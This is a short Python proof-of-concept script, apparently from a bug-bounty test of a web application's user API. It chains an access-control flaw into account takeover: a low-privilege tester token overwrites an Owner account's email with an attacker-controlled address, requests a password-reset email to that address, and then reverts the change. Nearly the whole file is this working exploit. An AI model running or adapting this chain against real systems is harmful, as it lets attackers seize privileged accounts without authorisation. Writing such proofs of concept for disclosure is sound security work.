import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
TT=open('/tmp/tok_Tester').read().strip()
TA=open('/tmp/tok_A').read().strip()
ATTACKER="zeno0@bugcrowdninja.com"
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TT),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def user(uid,tok=None):
    c,b=req('GET',f'/api/v1/users/{uid}',tok=tok)
    try: return json.loads(b)['users'][0]
    except: return {}
print("=== Tester(170) identity ===")
u=user(170,tok=TT); print(f"  {u.get('id')} {u.get('email')} role={u.get('role_id')}")
print("\n=== STEP 1: Tester overwrites Owner 231's email -> attacker alias ===")
before=user(231).get('email')
c,b=req('PUT','/api/v1/users/231',{"user":{"email":ATTACKER}},tok=TT)
after=user(231).get('email')
print(f"  PUT={c}  before={before!r} -> after={after!r}")
print(f"  {'*** LANDED ***' if after==ATTACKER else 'no change'}")
print("\n=== STEP 2: trigger password reset to that address (unauthenticated) ===")
cmd=['curl','-s','-m','30','-o','/tmp/r','-w','%{http_code}','-X','POST',
     H+'/api/v1/users/password-reset-email','-H',BB,'-H','Content-Type: application/json',
     '-d',json.dumps({"email":ATTACKER})]
c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
print(f"  password-reset-email -> {c} {open('/tmp/r',encoding='utf-8',errors='replace').read()[:120]}")
print("\n=== STEP 3: revert Owner email ===")
c,b=req('PUT','/api/v1/users/231',{"user":{"email":before}},tok=TT)
print(f"  reverted -> {user(231).get('email')!r}")
